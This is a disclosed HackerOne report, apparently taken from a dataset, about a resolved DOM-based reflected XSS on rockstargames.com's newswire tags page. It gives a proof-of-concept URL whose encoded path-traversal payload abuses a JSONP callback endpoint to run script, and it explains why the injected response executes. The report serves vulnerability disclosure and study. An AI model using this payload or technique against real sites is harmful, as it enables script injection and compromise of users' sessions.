---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '172843'
original_report_id: '172843'
title: DOM based reflected XSS in rockstargames.com/newswire/tags through cross domain
  ajax request
weakness: Cross-site Scripting (XSS) - Generic
team_handle: rockstargames
created_at: '2016-09-29T08:28:52.602Z'
disclosed_at: '2017-03-17T15:06:23.980Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 27
asset_identifier: '*.rockstargames.com'
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# DOM based reflected XSS in rockstargames.com/newswire/tags through cross domain ajax request

## Metadata

- HackerOne Report ID: 172843
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: rockstargames
- Disclosed At: 2017-03-17T15:06:23.980Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I have found a reflected XSS issue in `http://www.rockstargames.com/newswire/tags` which is , IMO , somekinda tricky. 

#PoC:
- **URL:** `http://www.rockstargames.com/newswire/tags#/?tags=\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f` 
- **Vulnerable Parameter:** `#/?tags=` 
- **Payload:** `\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f`  

{F123778}

The value of the `tags` parameter is sent as an XHR request to `/newswire/tagContent/[tags_param]/1` and the response gets printed in the page , also I have found that if the `content-type` of the response is `application/javascript` , it gets executed as javascript. 
After digging for a while I found this endpoint `www.rockstargames.com/comments_dal/users/getGlobalLoginSettings.json` which returns a callback function in the response if the request is XHR. so I used the callback function to execute javascript through `?callback=alert(/xss/);//` 

Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
